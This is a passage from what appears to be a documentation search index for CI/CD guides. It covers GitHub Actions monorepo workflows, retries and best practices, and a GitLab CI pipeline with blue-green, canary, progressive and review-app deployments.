actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n\n      - name: Install Turborepo\n        run: npm install -g turbo\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build package\n        run: turbo run build --filter=@myorg/${{ matrix.package }}\n\n      - name: Test package\n        run: turbo run test --filter=@myorg/${{ matrix.package }}\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#nx-monorepo","title":"Nx Monorepo","text":"<pre><code>name: Nx Monorepo\n\non:\n  pull_request:\n    branches: [main]\n\njobs:\n  affected:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Derive appropriate SHAs for base and head\n        uses: nrwl/nx-set-shas@v3\n\n      - name: Lint affected projects\n        run: npx nx affected --target=lint --parallel=3\n\n      - name: Test affected projects\n        run: npx nx affected --target=test --parallel=3 --code-coverage\n\n      - name: Build affected projects\n        run: npx nx affected --target=build --parallel=3\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#advanced-patterns","title":"Advanced Patterns","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#dynamic-matrix-from-api","title":"Dynamic Matrix from API","text":"<pre><code>jobs:\n  get-environments:\n    runs-on: ubuntu-latest\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n\n    steps:\n      - name: Fetch environments from API\n        id: set-matrix\n        run: |\n          ENVS=$(curl -s https://api.example.com/environments | jq -c '.')\n          echo \"matrix=$ENVS\" &gt;&gt; $GITHUB_OUTPUT\n\n  deploy:\n    needs: get-environments\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix: ${{ fromJSON(needs.get-environments.outputs.matrix) }}\n\n    steps:\n      - name: Deploy to ${{ matrix.environment }}\n        run: ./deploy.sh ${{ matrix.environment }} ${{ matrix.region }}\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#composite-actions","title":"Composite Actions","text":"<pre><code>## .github/actions/setup-app/action.yml\nname: 'Setup Application'\ndescription: 'Setup Node.js and install dependencies'\n\ninputs:\n  node-version:\n    description: 'Node.js version'\n    required: false\n    default: '20'\n  cache-key:\n    description: 'Cache key suffix'\n    required: false\n    default: 'default'\n\nruns:\n  using: 'composite'\n  steps:\n    - name: Setup Node.js\n      uses: actions/setup-node@v4\n      with:\n        node-version: ${{ inputs.node-version }}\n        cache: 'npm'\n\n    - name: Cache dependencies\n      uses: actions/cache@v3\n      with:\n        path: node_modules\n        key: ${{ runner.os }}-npm-${{ inputs.cache-key }}-${{ hashFiles('**/package-lock.json') }}\n\n    - name: Install dependencies\n      shell: bash\n      run: npm ci\n\n## Usage in workflow\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup\n        uses: ./.github/actions/setup-app\n        with:\n          node-version: '20'\n          cache-key: 'build'\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#self-hosted-runners-with-labels","title":"Self-Hosted Runners with Labels","text":"<pre><code>jobs:\n  build-on-custom-hardware:\n    runs-on: [self-hosted, linux, x64, gpu]\n    timeout-minutes: 60\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build with GPU acceleration\n        run: ./build-with-gpu.sh\n\n  build-on-cloud:\n    runs-on: ubuntu-latest\n    timeout-minutes: 30\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Standard build\n        run: ./build.sh\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#troubleshooting","title":"Troubleshooting","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#debug-logging","title":"Debug Logging","text":"<pre><code>jobs:\n  debug:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Enable debug logging\n        run: echo \"ACTIONS_STEP_DEBUG=true\" &gt;&gt; $GITHUB_ENV\n\n      - name: Dump context\n        run: |\n          echo \"github context:\"\n          echo \"${{ toJSON(github) }}\"\n          echo \"runner context:\"\n          echo \"${{ toJSON(runner) }}\"\n          echo \"job context:\"\n          echo \"${{ toJSON(job) }}\"\n\n      - name: Debug with tmate\n        uses: mxschmitt/action-tmate@v3\n        if: failure()\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#retry-failed-jobs","title":"Retry Failed Jobs","text":"<pre><code>jobs:\n  flaky-test:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run flaky test with retry\n        uses: nick-invision/retry@v2\n        with:\n          timeout_minutes: 10\n          max_attempts: 3\n          retry_wait_seconds: 30\n          command: npm test\n\n      - name: Retry on failure only\n        uses: nick-invision/retry@v2\n        with:\n          timeout_minutes: 5\n          max_attempts: 3\n          retry_on: error\n          command: ./flaky-script.sh\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#handle-rate-limits","title":"Handle Rate Limits","text":"<pre><code>jobs:\n  api-call:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Call external API with backoff\n        uses: nick-invision/retry@v2\n        with:\n          timeout_minutes: 10\n          max_attempts: 5\n          retry_wait_seconds: 60\n          exponential_backoff: true\n          command: curl -f https://api.example.com/data\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#best-practices","title":"Best Practices","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#workflow-organization","title":"Workflow Organization","text":"<ol> <li>Use Job Dependencies: Chain jobs with <code>needs</code> to create clear pipelines</li> <li>Set Timeouts: Always set <code>timeout-minutes</code> to prevent hung jobs</li> <li>Use Concurrency Groups: Prevent multiple deployments to same environment</li> <li>Fail Fast: Use <code>fail-fast: false</code> in matrices when you want all combinations to run</li> </ol>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#performance","title":"Performance","text":"<ol> <li>Cache Aggressively: Cache dependencies, build outputs, Docker layers</li> <li>Use Matrix Builds: Test multiple versions in parallel</li> <li>Conditional Execution: Skip unnecessary jobs with path filters</li> <li>Reusable Workflows: Extract common patterns into reusable workflows</li> </ol>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#security-guidelines","title":"Security Guidelines","text":"<ol> <li>Use OIDC: Prefer OIDC over long-lived credentials</li> <li>Minimal Permissions: Use <code>permissions</code> to grant least privilege</li> <li>Pin Action Versions: Use SHA instead of tags for third-party actions</li> <li>Scan Dependencies: Use Dependabot and security scanning</li> <li>Never Log Secrets: Use <code>::add-mask::</code> or secret scanning</li> </ol>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#reliability","title":"Reliability","text":"<ol> <li>Add Retries: Use retry actions for flaky operations</li> <li>Health Checks: Verify deployments before promoting</li> <li>Rollback Plans: Include rollback steps in deployment jobs</li> <li>Monitor Deployments: Send notifications and create deployment markers</li> </ol>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#see-also","title":"See Also","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#related-cicd-guides","title":"Related CI/CD Guides","text":"<ul> <li>GitLab CI Guide - Alternative CI/CD platform</li> <li>Jenkins Pipeline Guide - Traditional CI/CD with Jenkins</li> <li>AI Validation Pipeline - Automated code review</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#development-practices","title":"Development Practices","text":"<ul> <li>Pre-commit Hooks Guide - Local validation before commits</li> <li>Local Validation Setup - Development environment setup</li> <li>IDE Integration Guide - Editor integration for validation</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#testing-security","title":"Testing &amp; Security","text":"<ul> <li>Testing Strategies - Test automation patterns</li> <li>Security Scanning Guide - SAST, SCA, secrets detection</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#language-specific-workflows","title":"Language-Specific Workflows","text":"<ul> <li>Python Guide - pytest, black, mypy workflows</li> <li>TypeScript Guide - Jest, ESLint, Prettier workflows</li> <li>Terraform Guide - terraform fmt, validate, plan workflows</li> <li>Docker Guide - Container build and push workflows</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#templates-configuration","title":"Templates &amp; Configuration","text":"<ul> <li>GitHub Actions Workflow Templates - Reusable workflows</li> <li>.gitignore Templates - Ignore patterns</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#core-documentation","title":"Core Documentation","text":"<ul> <li>Getting Started Guide - Repository setup</li> <li>Principles - CI/CD philosophy</li> <li>Structure Guide - Project organization</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#references","title":"References","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#official-documentation","title":"Official Documentation","text":"<ul> <li>GitHub Actions Documentation</li> <li>Workflow Syntax</li> <li>Actions Marketplace</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#security-resources","title":"Security Resources","text":"<ul> <li>OIDC with AWS</li> <li>Security Hardening</li> <li>Encrypted Secrets</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#advanced-topics","title":"Advanced Topics","text":"<ul> <li>Reusable Workflows</li> <li>Composite Actions</li> <li>Self-Hosted Runners</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-11-30 Status: Active</p>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/","title":"Comprehensive GitLab CI/CD Guide","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#overview","title":"Overview","text":"<p>This guide provides comprehensive coverage of GitLab CI/CD for production pipelines, focusing on real-world implementation patterns, deployment strategies, security best practices, and performance optimization.</p>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#what-this-guide-covers","title":"What This Guide Covers","text":"<ul> <li>\u2705 Complete CI/CD Pipelines: From build to production deployment</li> <li>\u2705 Multi-Environment Deployment: Dev, staging, production workflows</li> <li>\u2705 Security Best Practices: SAST, DAST, secrets management, container scanning</li> <li>\u2705 Performance Optimization: Caching, parallel jobs, DAG pipelines</li> <li>\u2705 Advanced Patterns: Mono repos, microservices, review apps, feature flags</li> <li>\u2705 Real-World Examples: Production-ready pipeline templates</li> </ul>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#related-documentation","title":"Related Documentation","text":"<ul> <li>Syntax Reference: See GitLab CI/CD Language Guide   for YAML syntax and basic concepts</li> <li>Validation Pipeline: See AI Validation Pipeline for quality   checks</li> </ul>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#complete-cicd-pipeline-example","title":"Complete CI/CD Pipeline Example","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#full-stack-application-pipeline","title":"Full-Stack Application Pipeline","text":"<pre><code>## .gitlab-ci.yml\nvariables:\n  NODE_VERSION: \"20\"\n  PYTHON_VERSION: \"3.11\"\n  DOCKER_DRIVER: overlay2\n  DOCKER_TLS_CERTDIR: \"/certs\"\n  FF_USE_FASTZIP: \"true\"\n  ARTIFACT_COMPRESSION_LEVEL: \"fast\"\n  CACHE_COMPRESSION_LEVEL: \"fast\"\n\nstages:\n  - validate\n  - test\n  - build\n  - security\n  - deploy-staging\n  - smoke-test\n  - deploy-production\n  - monitor\n\n## ====================\n## VALIDATION STAGE\n## ====================\nlint:frontend:\n  stage: validate\n  image: node:${NODE_VERSION}-alpine\n  cache:\n    key:\n      files:\n        - frontend/package-lock.json\n    paths:\n      - frontend/node_modules/\n  script:\n    - cd frontend\n    - npm ci\n    - npm run lint\n    - npm run format:check\n    - npm run type-check\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      changes:\n        - frontend/**/*\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\nlint:backend:\n  stage: validate\n  image: python:${PYTHON_VERSION}-slim\n  cache:\n    key:\n      files:\n        - backend/requirements.txt\n    paths:\n      - .cache/pip/\n  before_script:\n    - pip install --cache-dir .cache/pip black flake8 mypy pylint\n    - cd backend\n    - pip install --cache-dir ../.cache/pip -r requirements.txt\n  script:\n    - black --check .\n    - flake8 .\n    - mypy . --ignore-missing-imports\n    - pylint **/*.py\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      changes:\n        - backend/**/*\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\n## ====================\n## TEST STAGE\n## ====================\ntest:frontend:\n  stage: test\n  image: node:${NODE_VERSION}-alpine\n  needs: [\"lint:frontend\"]\n  cache:\n    key:\n      files:\n        - frontend/package-lock.json\n    paths:\n      - frontend/node_modules/\n  script:\n    - cd frontend\n    - npm ci\n    - npm run test:unit -- --coverage\n    - npm run test:integration\n  coverage: '/All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/'\n  artifacts:\n    reports:\n      coverage_report:\n        coverage_format: cobertura\n        path: frontend/coverage/cobertura-coverage.xml\n    paths:\n      - frontend/coverage/\n    expire_in: 1 week\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      changes:\n        - frontend/**/*\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\ntest:backend:\n  stage: test\n  image: python:${PYTHON_VERSION}-slim\n  needs: [\"lint:backend\"]\n  services:\n    - postgres:15-alpine\n    - redis:7-alpine\n  variables:\n    POSTGRES_DB: testdb\n    POSTGRES_USER: postgres\n    POSTGRES_PASSWORD: postgres\n    POSTGRES_HOST_AUTH_METHOD: trust\n    DATABASE_URL: postgresql://postgres:postgres@postgres:5432/testdb\n    REDIS_URL: redis://redis:6379/0\n  cache:\n    key:\n      files:\n        - backend/requirements.txt\n    paths:\n      - .cache/pip/\n  before_script:\n    - pip install --cache-dir .cache/pip pytest pytest-cov pytest-asyncio\n    - cd backend\n    - pip install --cache-dir ../.cache/pip -r requirements.txt\n  script:\n    - pytest tests/unit -v --cov --cov-report=xml --cov-report=term\n    - pytest tests/integration -v\n  coverage: '/(?i)total.*? (100(?:\\.0+)?\\%|[1-9]?\\d(?:\\.\\d+)?\\%)$/'\n  artifacts:\n    reports:\n      coverage_report:\n        coverage_format: cobertura\n        path: backend/coverage.xml\n    paths:\n      - backend/htmlcov/\n    expire_in: 1 week\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      changes:\n        - backend/**/*\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\n## ====================\n## BUILD STAGE\n## ====================\nbuild:frontend:\n  stage: build\n  image: node:${NODE_VERSION}-alpine\n  needs: [\"test:frontend\"]\n  cache:\n    key:\n      files:\n        - frontend/package-lock.json\n    paths:\n      - frontend/node_modules/\n  script:\n    - cd frontend\n    - npm ci\n    - npm run build\n  artifacts:\n    paths:\n      - frontend/dist/\n    expire_in: 1 week\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      changes:\n        - frontend/**/*\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\nbuild:backend:image:\n  stage: build\n  image: docker:24-dind\n  needs: [\"test:backend\"]\n  services:\n    - docker:24-dind\n  before_script:\n    - echo \"$CI_REGISTRY_PASSWORD\" | docker login -u \"$CI_REGISTRY_USER\" --password-stdin $CI_REGISTRY\n  script:\n    - cd backend\n    - docker build\n        --build-arg BUILDKIT_INLINE_CACHE=1\n        --cache-from $CI_REGISTRY_IMAGE/backend:latest\n        --tag $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_SHA\n        --tag $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_REF_SLUG\n        --tag $CI_REGISTRY_IMAGE/backend:latest\n        .\n    - docker push $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_REF_SLUG\n    - docker push $CI_REGISTRY_IMAGE/backend:latest\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      changes:\n        - backend/**/*\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\n## ====================\n## SECURITY STAGE\n## ====================\nsast:\n  stage: security\n  needs: []\n  allow_failure: true\n\ndependency_scanning:\n  stage: security\n  needs: []\n  allow_failure: true\n\ncontainer_scanning:\n  stage: security\n  needs: [\"build:backend:image\"]\n  allow_failure: true\n  variables:\n    CI_APPLICATION_REPOSITORY: $CI_REGISTRY_IMAGE/backend\n    CI_APPLICATION_TAG: $CI_COMMIT_SHA\n\nsecret_detection:\n  stage: security\n  needs: []\n  allow_failure: true\n\n## ====================\n## DEPLOY TO STAGING\n## ====================\ndeploy:staging:frontend:\n  stage: deploy-staging\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  needs: [\"build:frontend\"]\n  environment:\n    name: staging\n    url: https://staging.example.com\n    on_stop: stop:staging\n  before_script:\n    - aws --version\n  script:\n    - aws s3 sync frontend/dist s3://$S3_BUCKET_STAGING --delete --cache-control \"public, max-age=31536000\"\n    - aws cloudfront create-invalidation --distribution-id $CLOUDFRONT_DIST_ID_STAGING --paths \"/*\"\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n\ndeploy:staging:backend:\n  stage: deploy-staging\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  needs: [\"build:backend:image\", \"container_scanning\"]\n  environment:\n    name: staging\n    url: https://staging.example.com\n  script:\n    - aws ecs update-service\n        --cluster staging-cluster\n        --service backend-service\n        --force-new-deployment\n        --task-definition backend-task:$CI_COMMIT_SHA\n    - aws ecs wait services-stable\n        --cluster staging-cluster\n        --services backend-service\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n\n## ====================\n## SMOKE TESTS\n## ====================\nsmoke-test:staging:\n  stage: smoke-test\n  image: postman/newman:alpine\n  needs: [\"deploy:staging:frontend\", \"deploy:staging:backend\"]\n  script:\n    - newman run tests/postman/smoke-tests.json\n        --env-var \"baseUrl=https://staging.example.com/api\"\n        --bail\n        --reporters cli,json\n        --reporter-json-export newman-results.json\n  artifacts:\n    when: always\n    reports:\n      junit: newman-results.json\n    expire_in: 1 week\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n\n## ====================\n## DEPLOY TO PRODUCTION\n## ====================\ndeploy:production:frontend:\n  stage: deploy-production\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  needs: [\"smoke-test:staging\"]\n  environment:\n    name: production\n    url: https://example.com\n    on_stop: rollback:production\n  before_script:\n    - aws --version\n  script:\n    - aws s3 sync frontend/dist s3://$S3_BUCKET_PRODUCTION --delete --cache-control \"public, max-age=31536000\"\n    - aws cloudfront create-invalidation --distribution-id $CLOUDFRONT_DIST_ID_PRODUCTION --paths \"/*\"\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n  resource_group: production\n\ndeploy:production:backend:\n  stage: deploy-production\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  needs: [\"smoke-test:staging\"]\n  environment:\n    name: production\n    url: https://example.com\n  script:\n    # Blue-green deployment\n    - |\n      # Deploy to green environment\n      aws ecs update-service \\\n        --cluster production-cluster \\\n        --service backend-service-green \\\n        --task-definition backend-task:$CI_COMMIT_SHA \\\n        --force-new-deployment\n\n      # Wait for green to be stable\n      aws ecs wait services-stable \\\n        --cluster production-cluster \\\n        --services backend-service-green\n\n      # Health check green environment\n      curl -f https://green.example.com/health || exit 1\n\n      # Switch traffic to green\n      aws elbv2 modify-listener \\\n        --listener-arn $LISTENER_ARN \\\n        --default-actions Type=forward,TargetGroupArn=$TARGET_GROUP_GREEN_ARN\n\n      # Wait for blue to drain\n      sleep 60\n\n      # Update blue to new version (for next deployment)\n      aws ecs update-service \\\n        --cluster production-cluster \\\n        --service backend-service-blue \\\n        --task-definition backend-task:$CI_COMMIT_SHA \\\n        --force-new-deployment\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n  resource_group: production\n\n## ====================\n## MONITORING\n## ====================\nperformance-test:production:\n  stage: monitor\n  image: grafana/k6:latest\n  needs: [\"deploy:production:backend\"]\n  script:\n    - k6 run --out json=results.json tests/performance/load.js\n  artifacts:\n    paths:\n      - results.json\n    expire_in: 1 week\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n  allow_failure: true\n\n## ====================\n## ROLLBACK\n## ====================\nrollback:production:\n  stage: deploy-production\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  environment:\n    name: production\n    action: stop\n  script:\n    - |\n      # Switch traffic back to blue\n      aws elbv2 modify-listener \\\n        --listener-arn $LISTENER_ARN \\\n        --default-actions Type=forward,TargetGroupArn=$TARGET_GROUP_BLUE_ARN\n\n      echo \"Rolled back to previous production version\"\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n\nstop:staging:\n  stage: deploy-staging\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  environment:\n    name: staging\n    action: stop\n  script:\n    - echo \"Stopping staging environment\"\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      when: manual\n\n## ====================\n## TEMPLATES\n## ====================\ninclude:\n  - template: Security/SAST.gitlab-ci.yml\n  - template: Security/Dependency-Scanning.gitlab-ci.yml\n  - template: Security/Container-Scanning.gitlab-ci.yml\n  - template: Security/Secret-Detection.gitlab-ci.yml\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#deployment-strategies","title":"Deployment Strategies","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#blue-green-deployment","title":"Blue-Green Deployment","text":"<pre><code>.deploy_template: &amp;deploy_template\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  before_script:\n    - aws --version\n\ndeploy:blue:\n  &lt;&lt;: *deploy_template\n  stage: deploy\n  environment:\n    name: production-blue\n  script:\n    - kubectl apply -f k8s/blue/\n    - kubectl wait --for=condition=ready pod -l app=myapp,slot=blue --timeout=5m\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\ndeploy:green:\n  &lt;&lt;: *deploy_template\n  stage: deploy\n  environment:\n    name: production-green\n  script:\n    - kubectl apply -f k8s/green/\n    - kubectl wait --for=condition=ready pod -l app=myapp,slot=green --timeout=5m\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\nswitch:traffic:\n  &lt;&lt;: *deploy_template\n  stage: deploy\n  needs: [\"deploy:green\"]\n  environment:\n    name: production\n  script:\n    - |\n      # Run smoke tests on green\n      curl -f https://green.example.com/health || exit 1\n\n      # Switch service to green\n      kubectl patch service myapp-service -p '{\"spec\":{\"selector\":{\"slot\":\"green\"}}}'\n\n      # Monitor for 5 minutes\n      sleep 300\n\n      # Check error rates\n      ERROR_RATE=$(curl -s \"https://monitoring.example.com/api/error-rate\")\n      if [ \"$ERROR_RATE\" -gt \"1\" ]; then\n        echo \"High error rate detected, rolling back\"\n        kubectl patch service myapp-service -p '{\"spec\":{\"selector\":{\"slot\":\"blue\"}}}'\n        exit 1\n      fi\n\n      echo \"Deployment successful\"\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#canary-deployment","title":"Canary Deployment","text":"<pre><code>deploy:canary:\n  stage: deploy\n  image: bitnami/kubectl:latest\n  environment:\n    name: production-canary\n  script:\n    - kubectl apply -f k8s/canary/\n    - |\n      # Start with 10% traffic\n      for weight in 10 25 50 75 100; do\n        echo \"Setting canary weight to $weight%\"\n        kubectl patch virtualservice myapp -p \"{\\\"spec\\\":{\\\"http\\\":[{\\\"weight\\\":$weight,\\\"route\\\":[{\\\"destination\\\":\\\"canary\\\"}]},{\\\"weight\\\":$((100-weight)),\\\"route\\\":[{\\\"destination\\\":\\\"stable\\\"}]}]}}\"\n\n        # Monitor for 5 minutes\n        sleep 300\n\n        # Check metrics\n        ERROR_RATE=$(curl -s \"https://monitoring.example.com/api/error-rate\")\n        LATENCY_P99=$(curl -s \"https://monitoring.example.com/api/latency-p99\")\n\n        if [ \"$ERROR_RATE\" -gt \"1\" ] || [ \"$LATENCY_P99\" -gt \"1000\" ]; then\n          echo \"Metrics exceeded thresholds, rolling back\"\n          kubectl delete -f k8s/canary/\n          kubectl patch virtualservice myapp -p '{\"spec\":{\"http\":[{\"weight\":100,\"route\":[{\"destination\":\"stable\"}]}]}}'\n          exit 1\n        fi\n      done\n\n      # Promote canary to stable\n      kubectl apply -f k8s/stable/ --force\n      kubectl delete -f k8s/canary/\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#rolling-deployment-with-progressive-rollout","title":"Rolling Deployment with Progressive Rollout","text":"<pre><code>deploy:progressive:\n  stage: deploy\n  image: bitnami/kubectl:latest\n  environment:\n    name: production\n  script:\n    - |\n      # Configure progressive rollout\n      kubectl set image deployment/myapp \\\n        myapp=$CI_REGISTRY_IMAGE/backend:$CI_COMMIT_SHA \\\n        --record\n\n      # Watch rollout with progressive strategy\n      kubectl rollout status deployment/myapp --timeout=15m\n\n      # Verify new pods are healthy\n      kubectl wait --for=condition=ready pod \\\n        -l app=myapp,version=$CI_COMMIT_SHA \\\n        --timeout=5m\n\n      # Run post-deployment health checks\n      for i in {1..10}; do\n        STATUS=$(curl -s -o /dev/null -w \"%{http_code}\" https://example.com/health)\n        if [ \"$STATUS\" != \"200\" ]; then\n          echo \"Health check failed with status $STATUS\"\n          kubectl rollout undo deployment/myapp\n          kubectl rollout status deployment/myapp --timeout=10m\n          exit 1\n        fi\n        sleep 3\n      done\n\n      echo \"Progressive deployment successful\"\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#review-apps-dynamic-environments","title":"Review Apps (Dynamic Environments)","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#automatic-review-app-creation","title":"Automatic Review App Creation","text":"<pre><code>review:start:\n  stage: deploy\n  image: bitnami/kubectl:latest\n  environment:\n    name: review/$CI_COMMIT_REF_SLUG\n    url: https://$CI_COMMIT_REF_SLUG.review.example.com\n    on_stop: review:stop\n    auto_stop_in: 1 week\n  script:\n    - |\n      # Create namespace for review app\n      kubectl create namespace review-$CI_COMMIT_REF_SLUG --dry-run=client -o yaml | kubectl apply -f -\n\n      # Deploy review app\n      helm upgrade --install review-$CI_COMMIT_REF_SLUG ./helm-chart \\\n        --namespace review-$CI_COMMIT_REF_SLUG \\\n        --set image.tag=$CI_COMMIT_SHA \\\n        --set ingress.host=$CI_COMMIT_REF_SLUG.review.example.com \\\n        --wait --timeout 5m\n\n      # Wait for pods to be ready\n      kubectl wait --for=condition=ready pod \\\n        -l app=review-app \\\n        -n review-$CI_COMMIT_REF_SLUG \\\n        --timeout=5m\n\n      echo \"Review app available at https://$CI_COMMIT_REF_SLUG.review.example.com\"\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n  resource_group: review/$CI_COMMIT_REF_SLUG\n\nreview:stop:\n  stage: deploy\n  image: bitnami/kubectl:latest\n  environment:\n    name: review/$CI_COMMIT_REF_SLUG\n    action: stop\n  script:\n    - helm uninstall review-$CI_COMMIT_REF_SLUG --namespace review-$CI_COMMIT_REF_SLUG\n    - kubectl delete namespace review-$CI_COMMIT_REF_SLUG\n  rules:\n    - if: 